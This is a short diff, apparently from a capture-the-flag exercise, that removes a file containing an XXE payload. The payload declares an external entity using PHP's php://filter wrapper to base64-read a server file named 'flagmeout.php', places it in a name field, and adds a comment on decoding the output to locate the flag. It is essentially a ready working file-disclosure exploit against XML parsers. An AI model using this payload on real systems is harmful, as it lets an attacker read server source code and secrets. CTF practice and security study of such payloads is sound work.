@@ -1,3 +1,0 @@
-<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE r [<!ENTITY a SYSTEM "php://filter/convert.base64-encode/resource=flagmeout.php">]><root><name>tst &a;</name><password>tett</password></root>
-
-# proceed to base32 decode and base64 decode to get flag's path.
